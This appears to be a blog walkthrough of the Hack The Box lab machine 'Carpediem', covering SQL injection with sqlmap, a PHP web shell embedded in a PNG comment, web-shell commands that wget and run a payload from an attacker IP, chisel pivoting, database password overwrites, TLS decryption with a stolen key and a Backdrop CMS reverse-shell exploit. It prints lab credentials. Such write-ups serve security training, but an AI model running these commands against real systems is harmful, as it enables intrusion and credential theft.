@@ -1,0 +1,525 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Carpediem [Hard] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Carpediem [Hard]"/>
+<meta name="twitter:description" content="scanning TCP Scan TARGET=10.10.11.167 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Comming Soon|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD Domain: carpediem."/>
+
+    <meta property="og:title" content="HTB - Carpediem [Hard]" />
+<meta property="og:description" content="scanning TCP Scan TARGET=10.10.11.167 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Comming Soon|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD Domain: carpediem." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/carpediem/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-07-03T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-03T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Carpediem [Hard]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 3, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          11 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">scanning</h1>
+<ul>
+<li><code>TCP</code> Scan</li>
+</ul>
+<pre tabindex="0"><code>TARGET=10.10.11.167 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-title: Comming Soon
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+</code></pre><ul>
+<li>Domain: <code>carpediem.htb</code></li>
+</ul>
+<h1 id="web-enum">Web enum</h1>
+<ul>
+<li>Examine the web page doesn&rsquo;t find anything</li>
+<li>Perform domain and subdomain search</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://carpediem.htb/ -x 401,403
+
+[17:38:16] 301 -  178B  - /img  -&gt;  http://carpediem.htb/img/
+[17:38:16] 200 -    3KB - /index.html
+[17:38:34] 301 -  178B  - /scripts  -&gt;  http://carpediem.htb/scripts/
+[17:38:38] 301 -  178B  - /styles  -&gt;  http://carpediem.htb/styles/
+
+&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://carpediem.htb/&#34; -H &#34;Host: FUZZ.carpediem.htb&#34;
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000048:   200        462 L    2174 W     31090 Ch    &#34;portal&#34;
+</code></pre><h1 id="httpportalcarpediemhtb"><a href="http://portal.carpediem.htb/">http://portal.carpediem.htb/</a></h1>
+<ul>
+<li>Can register an account</li>
+<li>Try xss on <a href="http://portal.carpediem.htb/?p=edit_account">http://portal.carpediem.htb/?p=edit_account</a></li>
+</ul>
+<pre tabindex="0"><code>&amp;contact=%3Cscript%3Eprompt(3)%3C%2Fscript%3E
+{&#34;status&#34;:&#34;failed&#34;,&#34;err&#34;:&#34;Data too long for column &#39;contact&#39; at row 1[]&#34;}
+</code></pre><ul>
+<li><a href="http://portal.carpediem.htb/?p=FUZZ">http://portal.carpediem.htb/?p=FUZZ</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u http://portal.carpediem.htb/?p=FUZZ --hl 341
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000286:   200        462 L    2174 W     31090 Ch    &#34;admin&#34;
+000000499:   200        338 L    891 W      18178 Ch    &#34;assets&#34;
+000000707:   200        338 L    891 W      18176 Ch    &#34;build&#34;
+000000885:   200        338 L    891 W      18180 Ch    &#34;classes&#34;
+000000994:   200        156 L    432 W      10060 Ch    &#34;config&#34;
+000001300:   200        338 L    891 W      18174 Ch    &#34;dist&#34;
+000001908:   200        462 L    2174 W     31090 Ch    &#34;home&#34;
+000002010:   200        338 L    891 W      18172 Ch    &#34;inc&#34;
+000002278:   200        338 L    891 W      18174 Ch    &#34;libs&#34;
+000002362:   200        336 L    878 W      18028 Ch    &#34;logout&#34;
+000002347:   200        409 L    991 W      20790 Ch    &#34;login&#34;
+000003003:   200        338 L    891 W      18180 Ch    &#34;plugins&#34;
+000002017:   200        157209   262192 W   2261145 C   &#34;index&#34;
+000003343:   200        441 L    1074 W     22391 Ch    &#34;registration&#34;
+000004216:   200        338 L    891 W      18180 Ch    &#34;uploads&#34;
+
+Warning: include(assets/index.php): failed to open stream: No such file or directory in /var/www/html/portal/index.php on line 14
+
+Warning: include(): Failed opening &#39;assets/index.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/portal/index.php on line 14
+</code></pre><ul>
+<li><a href="http://portal.carpediem.htb/?p=bikes&amp;s=%27">http://portal.carpediem.htb/?p=bikes&amp;s=%27</a></li>
+<li><a href="http://portal.carpediem.htb/?p=view_bike&amp;id=3c59dc048e8850243be8079a5c74d079">http://portal.carpediem.htb/?p=view_bike&amp;id=3c59dc048e8850243be8079a5c74d079</a></li>
+<li>/classes/Master.php?f=save_booking</li>
+</ul>
+<pre tabindex="0"><code>{&#34;status&#34;:&#34;failed&#34;,&#34;err&#34;:&#34;Incorrect date value: &#39;&#39; for column &#39;date_start&#39; at row 1[INSERT INTO `rent_list` set  `bike_id`=&#39;21&#39; , `date_start`=&#39;&#39; , `date_end`=&#39;&#39; , `rent_days`=&#39;0&#39; , `amount`=&#39;0&#39; , `client_id`=&#39;26&#39;  ]&#34;}
+
+{&#34;status&#34;:&#34;failed&#34;,&#34;err&#34;:&#34;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;2022-07-19&#39;&#39; , `rent_days`=&#39;0&#39; , `amount`=&#39;0&#39; , `client_id`=&#39;26&#39;&#39; at line 1[INSERT INTO `rent_list` set  `bike_id`=&#39;21&#39; , `date_start`=&#39;2022-07-19&#39;&#39; , `date_end`=&#39;2022-07-19&#39;&#39; , `rent_days`=&#39;0&#39; , `amount`=&#39;0&#39; , `client_id`=&#39;26&#39;  ]&#34;}
+</code></pre><ul>
+<li>date_start is vulnerable to sqli</li>
+<li>save the burp req and use sqlmap</li>
+</ul>
+<pre tabindex="0"><code>&gt; sqlmap -r save_booking.req -p date_start
+[18:05:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+7
+[18:05:56] [INFO] retrieved: 
+[18:06:01] [INFO] adjusting time delay to 1 second due to good response times
+bike_list
+[18:06:39] [INFO] retrieved: brand_list
+[18:07:21] [INFO] retrieved: categories
+[18:07:59] [INFO] retrieved: file_list
+[18:08:41] [INFO] retrieved: rent_list
+[18:09:24] [INFO] retrieved: system_info
+[18:10:15] [INFO] retrieved: users
+[18:10:36] [INFO] fetching columns for table &#39;bike_list&#39; in database &#39;portal&#39;
+[18:10:36] [WARNING] the SQL query provided does not return any output
+[18:10:36] [WARNING] unable to retrieve column names for table &#39;bike_list&#39; in database &#39;portal&#39;
+</code></pre><ul>
+<li>for some reason, date_start cannot be used to dump columns</li>
+<li>retry by specifying the columns to dump</li>
+</ul>
+<pre tabindex="0"><code>&gt; sqlmap -r save_booking.req -p date_start -D portal -T users -C username,password --dump --flush-session --dbms mysql
++----------+---------------------------------------------+
+| username | password                                    |
++----------+---------------------------------------------+
+| meow     | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
+| test     | 16d7a4fca7442dda3ad93c9a726597e4 (test1234) |
+| admin    | b723e511b084ab84b44235d82da572f3            |
++----------+---------------------------------------------+
+</code></pre><ul>
+<li>
+<p>admin hash is not crackable</p>
+</li>
+<li>
+<p>register an account, and update profile, found a parameter <code>login_type</code>, can change to 1 to get admin privilege. Then browse to <a href="http://portal.carpediem.htb/admin/">http://portal.carpediem.htb/admin/</a> to access the admin panel</p>
+</li>
+<li>
+<p>there is an avatar upload page: <a href="http://portal.carpediem.htb/admin/?page=user">http://portal.carpediem.htb/admin/?page=user</a></p>
+</li>
+<li>
+<p>craft a php file and intercept the request to change the extension to .jpg can successfully upload</p>
+</li>
+<li>
+<p>there is an avatar field in the user&rsquo;s profile, can sqli to find out the setting</p>
+</li>
+</ul>
+<pre tabindex="0"><code>[02:36:14] [INFO] retrieved: uploads/1658294700_meow.jpg
+Database: portal
+Table: users
+[2 entries]
++-----------------------------------+
+| avatar                            |
++-----------------------------------+
+| uploads/1635793020_HONDA_XADV.png |
+| uploads/1658294700_meow.jpg       |
++-----------------------------------+
+</code></pre><h1 id="foothold">foothold</h1>
+<ul>
+<li>the uploaded avatar can be used for RCE</li>
+<li>get a png file and add a comment to it with php backdoor</li>
+</ul>
+<pre tabindex="0"><code>&gt; exiftool -Comment=&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#39;c&#39;]); ?&gt;&#39; meow.png
+&gt; http://portal.carpediem.htb/uploads/1658300760_meow.php?c=python3+-V
+&gt; http://portal.carpediem.htb/uploads/1658300340_meow.php?c=wget+http://10.10.16.27/e.py
+&gt; http://portal.carpediem.htb/uploads/1658300340_meow.php?c=python3+e.py
+</code></pre><ul>
+<li>move the uploaded shells to a convenient place to make the access easier</li>
+</ul>
+<pre tabindex="0"><code>&gt; http://portal.carpediem.htb/meow.php?c=wget+http://10.10.16.27/e.py
+&gt; http://portal.carpediem.htb/meow.php?c=python3+e.py
+&gt; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><ul>
+<li>read file to get db password</li>
+</ul>
+<pre tabindex="0"><code>&gt; www-data@3c371615b7aa:/var/www/html/portal$ cat classes/DBConnection.php
+
+private $host = &#39;mysql&#39;;
+private $username = &#39;portaldb&#39;;
+private $password = &#39;J5tnqsXpyzkK4XNt&#39;;
+private $database = &#39;portal&#39;;
+</code></pre><ul>
+<li>this might be a docker container</li>
+</ul>
+<h1 id="pe1">pe1</h1>
+<ul>
+<li>upload linpeas and enum</li>
+</ul>
+<pre tabindex="0"><code>[+] Container &amp; breakout enumeration
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+[+] Container ID ................... 3c371615b7aa
+[+] Container Full ID .............. 3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
+[+] Vulnerable to CVE-2019-5021 .. No
+
+&gt; env
+MYSQL_NAME=/portal/mysql
+MYSQL_PORT=tcp://172.17.0.4:3306
+MYSQL_ENV_MYSQL_ROOT_PASSWORD=3dQXeqjMHnq4kqDv
+
+MYSQL_PORT_3306_TCP_PROTO=tcp
+MYSQL_PORT_3306_TCP_ADDR=172.17.0.4
+MYSQL_PORT_3306_TCP_PORT=3306
+MYSQL_PORT_3306_TCP=tcp://172.17.0.4:3306
+
+MYSQL_PORT_33060_TCP_PROTO=tcp
+MYSQL_PORT_33060_TCP_ADDR=172.17.0.4
+MYSQL_PORT_33060_TCP_PORT=33060
+MYSQL_PORT_33060_TCP=tcp://172.17.0.4:33060
+</code></pre><ul>
+<li>Check hosts file</li>
+</ul>
+<pre tabindex="0"><code>&gt; cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.4      mysql a5004fe641ca
+172.17.0.5      3c371615b7aa
+</code></pre><h1 id="setup-pivot">Setup pivot</h1>
+<ul>
+<li><a href="https://ap3x.github.io/posts/pivoting-with-chisel/">https://ap3x.github.io/posts/pivoting-with-chisel/</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; chisel server -p 8888 --reverse
+&gt; ./chisel client 10.10.16.27:8888 R:1080:socks
+# add socks 127.0.0.1 1080 to /etc/proxychains4.conf
+</code></pre><ul>
+<li>setup chisel reverse proxy and connect to databasse, not connectable</li>
+</ul>
+<pre tabindex="0"><code>&gt; proxychains mysql --host=172.17.0.4 --port=3306 --user=portaldb --password=J5tnqsXpyzkK4XNt -D portal
+&gt; proxychains mysql --host=172.17.0.4 --port=3306 --user=root --password=3dQXeqjMHnq4kqDv
+</code></pre><h1 id="mongodb">mongodb</h1>
+<ul>
+<li>connect to mongo db and enum</li>
+</ul>
+<pre tabindex="0"><code>&gt; proxychains mongo 172.17.0.3
+&gt; show dbs
+admin    0.000GB
+config   0.000GB
+local    0.000GB
+trudesk  0.001GB
+&gt; use truedesk
+&gt; db.accounts.find()
+{ &#34;_id&#34; : ObjectId(&#34;623c8b20855cc5001a8ba13c&#34;), &#34;preferences&#34; : { &#34;tourCompleted&#34; : false, &#34;autoRefreshTicketGrid&#34; : true, &#34;openChatWindows&#34; : [ ] }, &#34;hasL2Auth&#34; : false, &#34;deleted&#34; : false, &#34;username&#34; : &#34;admin&#34;, &#34;password&#34; : &#34;$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS&#34;, &#34;fullname&#34; : &#34;Robert Frost&#34;, &#34;email&#34; : &#34;rfrost@carpediem.htb&#34;, &#34;role&#34; : ObjectId(&#34;623c8b20855cc5001a8ba138&#34;), &#34;title&#34; : &#34;Sr. Network Engineer&#34;, &#34;accessToken&#34; : &#34;22e56ec0b94db029b07365d520213ef6f5d3d2d9&#34;, &#34;__v&#34; : 0, &#34;lastOnline&#34; : ISODate(&#34;2022-04-07T20:30:32.198Z&#34;) }
+{ &#34;_id&#34; : ObjectId(&#34;6243c0be1e0d4d001b0740d4&#34;), &#34;preferences&#34; : { &#34;tourCompleted&#34; : false, &#34;autoRefreshTicketGrid&#34; : true, &#34;openChatWindows&#34; : [ ] }, &#34;hasL2Auth&#34; : false, &#34;deleted&#34; : false, &#34;username&#34; : &#34;jhammond&#34;, &#34;email&#34; : &#34;jhammond@carpediem.htb&#34;, &#34;password&#34; : &#34;$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq&#34;, &#34;fullname&#34; : &#34;Jeremy Hammond&#34;, &#34;title&#34; : &#34;Sr. Systems Engineer&#34;, &#34;role&#34; : ObjectId(&#34;623c8b20855cc5001a8ba139&#34;), &#34;accessToken&#34; : &#34;a0833d9a06187dfd00d553bd235dfe83e957fd98&#34;, &#34;__v&#34; : 0, &#34;lastOnline&#34; : ISODate(&#34;2022-04-01T23:36:55.940Z&#34;) }
+{ &#34;_id&#34; : ObjectId(&#34;6243c28f1e0d4d001b0740d6&#34;), &#34;preferences&#34; : { &#34;tourCompleted&#34; : false, &#34;autoRefreshTicketGrid&#34; : true, &#34;openChatWindows&#34; : [ ] }, &#34;hasL2Auth&#34; : false, &#34;deleted&#34; : false, &#34;username&#34; : &#34;jpardella&#34;, &#34;email&#34; : &#34;jpardella@carpediem.htb&#34;, &#34;password&#34; : &#34;$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK&#34;, &#34;fullname&#34; : &#34;Joey Pardella&#34;, &#34;title&#34; : &#34;Desktop Support&#34;, &#34;role&#34; : ObjectId(&#34;623c8b20855cc5001a8ba139&#34;), &#34;accessToken&#34; : &#34;7c0335559073138d82b64ed7b6c3efae427ece85&#34;, &#34;__v&#34; : 0, &#34;lastOnline&#34; : ISODate(&#34;2022-04-07T20:33:20.918Z&#34;) }
+{ &#34;_id&#34; : ObjectId(&#34;6243c3471e0d4d001b0740d7&#34;), &#34;preferences&#34; : { &#34;tourCompleted&#34; : false, &#34;autoRefreshTicketGrid&#34; : true, &#34;openChatWindows&#34; : [ ] }, &#34;hasL2Auth&#34; : false, &#34;deleted&#34; : false, &#34;username&#34; : &#34;acooke&#34;, &#34;email&#34; : &#34;acooke@carpediem.htb&#34;, &#34;password&#34; : &#34;$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.&#34;, &#34;fullname&#34; : &#34;Adeanna Cooke&#34;, &#34;title&#34; : &#34;Director - Human Resources&#34;, &#34;role&#34; : ObjectId(&#34;623c8b20855cc5001a8ba139&#34;), &#34;accessToken&#34; : &#34;9c7ace307a78322f1c09d62aae3815528c3b7547&#34;, &#34;__v&#34; : 0, &#34;lastOnline&#34; : ISODate(&#34;2022-03-30T14:21:15.212Z&#34;) }
+{ &#34;_id&#34; : ObjectId(&#34;6243c69d1acd1559cdb4019b&#34;), &#34;preferences&#34; : { &#34;tourCompleted&#34; : false, &#34;autoRefreshTicketGrid&#34; : true, &#34;openChatWindows&#34; : [ ] }, &#34;hasL2Auth&#34; : false, &#34;deleted&#34; : false, &#34;username&#34; : &#34;svc-portal-tickets&#34;, &#34;email&#34; : &#34;tickets@carpediem.htb&#34;, &#34;password&#34; : &#34;$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW&#34;, &#34;fullname&#34; : &#34;Portal Tickets&#34;, &#34;title&#34; : &#34;&#34;, &#34;role&#34; : ObjectId(&#34;623c8b20855cc5001a8ba13a&#34;), &#34;accessToken&#34; : &#34;f8691bd2d8d613ec89337b5cd5a98554f8fffcc4&#34;, &#34;__v&#34; : 0, &#34;lastOnline&#34; : ISODate(&#34;2022-03-30T13:50:02.824Z&#34;) }
+
+&gt; db.system.users.find()
+{ &#34;_id&#34; : &#34;trudesk.trudesk&#34;, &#34;userId&#34; : UUID(&#34;91edf315-70ed-424b-8af5-df2be2559a88&#34;), &#34;user&#34; : &#34;trudesk&#34;, &#34;db&#34; : &#34;trudesk&#34;, &#34;credentials&#34; : { &#34;SCRAM-SHA-1&#34; : { &#34;iterationCount&#34; : 10000, &#34;salt&#34; : &#34;Ko2s2ZtnyVXoPkj8V9swbQ==&#34;, &#34;storedKey&#34; : &#34;RMcvISwRJ/G3Phy536k7qXNxrwY=&#34;, &#34;serverKey&#34; : &#34;DVRoL2j5ZNdejyf6TxM7XiD+vzw=&#34; }, &#34;SCRAM-SHA-256&#34; : { &#34;iterationCount&#34; : 15000, &#34;salt&#34; : &#34;R8aRmvuyjDHYUIpv28g/p5k3KVexBC4URSbE/g==&#34;, &#34;storedKey&#34; : &#34;II/yV9Z2qyjX7TDXYI+Zqh3903ZeTtmiT082SH7k0CY=&#34;, &#34;serverKey&#34; : &#34;8J62Bb5ugt2OJalKj1NMq6FFsyFLhRpxXMRSmR9EeDM=&#34; } }, &#34;roles&#34; : [ { &#34;role&#34; : &#34;userAdmin&#34;, &#34;db&#34; : &#34;trudesk&#34; } ] }
+</code></pre><ul>
+<li>found hashes. Encryption uses blowfish, it&rsquo;s anti-cracking</li>
+<li>generate a new password to overwrite</li>
+</ul>
+<pre tabindex="0"><code>&gt; python -c &#34;import bcrypt; print(bcrypt.hashpw(&#39;password&#39;.encode(), bcrypt.gensalt(rounds=10)))&#34;
+b&#39;$2b$10$JUb0RCD6qKWm/Cwcq2i2cuVg.LY5AFCOESd6hAuv2YuKY3Tw9nAyO&#39;
+&gt; db.getCollection(&#34;accounts&#34;).update({_id: ObjectId(&#34;623c8b20855cc5001a8ba13c&#34;)},{$set :{&#34;password&#34;:&#34;$2b$10$JUb0RCD6qKWm/Cwcq2i2cuVg.LY5AFCOESd6hAuv2YuKY3Tw9nAyO&#34;}});
+</code></pre><ul>
+<li>login into trudesk.carpediem.htb</li>
+</ul>
+<pre tabindex="0"><code>learn about a new employee whose credential can be found via VoIP
+Last 4 of employee ID is 9650.
+
+Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62
+
+9650:2022 and carpediem.htb as the domain to login via zoiper
+</code></pre><ul>
+<li>new employee username Horace Flaccus: hflaccus</li>
+<li>connect to sip and dial *62, enter pin 2022, listen to the voice mail</li>
+<li>login as hflaccus to get the user flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh hflaccus@10.10.11.167
+`AuRj4pxq9qPk`
+</code></pre><h1 id="pivoting-scan">pivoting scan</h1>
+<ul>
+<li>run scan via the pivot</li>
+</ul>
+<pre tabindex="0"><code>&gt; proxychains nmap -p21,22,80,443,3306,33060,8118,27017 10 172.17.0.1-10 -Pn -v -sT
+
+Nmap scan report for 172.17.0.1
+Host is up (0.47s latency).
+
+PORT      STATE  SERVICE
+22/tcp    open   ssh
+80/tcp    open   http
+
+Nmap scan report for 172.17.0.2
+Host is up (0.40s latency).
+
+PORT      STATE  SERVICE
+21/tcp    open   ftp
+80/tcp    open   http
+443/tcp   open   https
+
+Nmap scan report for 172.17.0.3
+Host is up (0.47s latency).
+
+PORT      STATE  SERVICE
+27017/tcp open   mongod
+
+Nmap scan report for 172.17.0.4
+Host is up (0.47s latency).
+
+PORT      STATE  SERVICE
+3306/tcp  open   mysql
+33060/tcp open   mysqlx
+
+Nmap scan report for 172.17.0.5
+Host is up (0.46s latency).
+
+PORT      STATE  SERVICE
+8118/tcp  open   privoxy
+
+Nmap scan report for 172.17.0.6
+Host is up (0.47s latency).
+
+PORT      STATE  SERVICE
+80/tcp    open   http
+</code></pre><h1 id="pe">pe</h1>
+<ul>
+<li>upload linpeas and do enum</li>
+</ul>
+<pre tabindex="0"><code>[+] Searching ssl/ssh files
+PermitRootLogin yes
+PubkeyAuthentication yes
+ChallengeResponseAuthentication no
+UsePAM yes
+PasswordAuthentication yes
+Possible private SSH keys were found!
+/etc/ssl/certs/backdrop.carpediem.htb.key
+ --&gt; /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+</code></pre><ul>
+<li>Copy /etc/ssl/certs/backdrop.carpediem.htb.key to local</li>
+<li>Capture traffic on docker0 interface</li>
+</ul>
+<pre tabindex="0"><code>&gt; tcpdump -i docker0 -w  docker0.pcap
+</code></pre><ul>
+<li>Run wireshark and import the backdrop.carpediem.htb.key into the RSA key list of TLS protocol</li>
+<li>follow a TLS1.2 stream and find the credential: <code>jpardella:tGPN6AmJDZwYWdhY</code></li>
+</ul>
+<pre tabindex="0"><code>POST /?q=user/login HTTP/1.1
+Host: backdrop.carpediem.htb:8002
+User-Agent: python-requests/2.22.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Origin: https://backdrop.carpediem.htb:8002
+Content-Type: application/x-www-form-urlencoded
+Referer: https://backdrop.carpediem.htb:8002/?q=user/login
+Accept-Language: en-US,en;q=0.9
+Content-Length: 128
+
+name=jpardella&amp;pass=tGPN6AmJDZwYWdhY&amp;form_build_id=form-rXfWvmvOz0ihcfyBBwhTF3TzC8jkPBx4LvUBrdAIsU8&amp;form_id=user_login&amp;op=Log+inHTTP/1.1 302 Found
+Date: Thu, 21 Jul 2022 23:13:01 GMT
+Server: Apache/2.4.48 (Ubuntu)
+Expires: Fri, 16 Jan 2015 07:50:00 GMT
+Last-Modified: Thu, 21 Jul 2022 23:13:01 +0000
+Cache-Control: no-cache, must-revalidate
+X-Content-Type-Options: nosniff
+ETag: &#34;1658445181&#34;
+Set-Cookie: SSESS0651e6855a1f90fa8155e44165bd9f99=TTtY1mdMcNFUi7UHtkNxqyDQiLeC_TcV6_rA6SHXZsA; expires=Sun, 14-Aug-2022 02:46:21 GMT; Max-Age=2000000; path=/; domain=.backdrop.carpediem.htb; secure; HttpOnly
+Location: https://backdrop.carpediem.htb:8002/?q=admin/dashboard
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+</code></pre><ul>
+<li>find out which internal port is running backdrop</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -k https://127.0.0.1:8002
+</code></pre><ul>
+<li>map remote port to local</li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh -L 8002:127.0.0.1:8002 hflaccus@10.10.11.167
+</code></pre><ul>
+<li>use backdrop CMS RCE exploit: <a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop">https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop</a></li>
+<li>download the reference.tar, change shell.php to a php reverse shell.</li>
+<li>create another reference.tar file and upload it to be installed</li>
+<li>go to https://127.0.0.1:8002/modules/reference/shell.php to trigger the reverse shell</li>
+<li>upload pspy64 and monitor background processes</li>
+</ul>
+<pre tabindex="0"><code>2022/07/24 19:23:46 CMD: UID=0    PID=4360   | cp /root/index.php /var/www/html/backdrop/index.php 
+2022/07/24 19:24:01 CMD: UID=0    PID=4362   | /usr/sbin/CRON -P 
+2022/07/24 19:24:01 CMD: UID=0    PID=4361   | /usr/sbin/CRON -P 
+2022/07/24 19:24:01 CMD: UID=0    PID=4363   | /usr/sbin/CRON -P 
+2022/07/24 19:24:01 CMD: UID=0    PID=4364   | /usr/sbin/CRON -P 
+2022/07/24 19:24:01 CMD: UID=0    PID=4365   | /bin/sh -c sleep 45; /bin/bash /opt/heartbeat.sh 
+2022/07/24 19:24:01 CMD: UID=0    PID=4366   | /bin/sh -c sleep 15; /bin/bash /opt/heartbeat.sh 
+2022/07/24 19:24:16 CMD: UID=0    PID=4367   | /bin/bash /opt/heartbeat.sh 
+2022/07/24 19:24:16 CMD: UID=0    PID=4368   | /usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh 
+2022/07/24 19:24:16 CMD: UID=0    PID=4369   | /bin/bash /opt/heartbeat.sh 
+2022/07/24 19:24:16 CMD: UID=0    PID=4370   | grep Welcome to backdrop.carpediem.htb! &lt;!DOCTYPE html&gt;
+</code></pre><ul>
+<li>/opt/heartbeat.sh</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#Run a site availability check every 10 seconds via cron</span>
+</span></span><span style="display:flex;"><span>checksum<span style="color:#f92672">=(</span><span style="color:#66d9ef">$(</span>/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh<span style="color:#66d9ef">)</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $checksum !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;70a121c0202a33567101e2330c069b34&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        exit
